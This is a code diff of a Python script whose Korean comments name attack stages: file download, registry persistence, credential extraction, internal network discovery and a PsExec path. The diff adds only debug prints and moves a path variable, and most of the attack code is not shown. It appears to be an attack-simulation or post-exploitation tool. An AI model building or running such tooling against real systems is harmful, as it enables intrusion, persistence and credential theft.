@@ -16,9 +16,12 @@ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(("8.8.8.8", 80))
 e = s.getsockname()[0]
 
+set_path = 'C:\module2'
+
 # 파일다운로드
 def file_download():
     try:
+        print(1)
         # --- Intro Setting
         set_path = 'C:\module2'
         os.mkdir(set_path)
@@ -54,6 +57,7 @@ def file_download():
 # 레지스트리 추가(지속성)
 def add_reg():
     try:
+        print(2)
         i = 1/0
         info_List.append(('Add Registry', 'Ok'))
     except:
@@ -62,6 +66,7 @@ def add_reg():
 # 크레델셜 획득
 def get_credential():
     try:
+        print(3)
         # 크레딘셜 추출 및 저장
         credential_path = set_path + '\GetCredential'
         os.mkdir(credential_path)
@@ -146,6 +151,7 @@ def get_credential():
 # 내부 탐색
 def net_discovery():
     try:
+        print(4)
         # Ip Discovery
         #-- setting
         IpDiscovery_path = set_path + '\IpDiscovery'
@@ -242,5 +248,3 @@ get_credential()
 net_discovery()
 exit()
 Socket_Create()
-
-# 'C:\module2\DownloadFile-main\PsExec.exe'
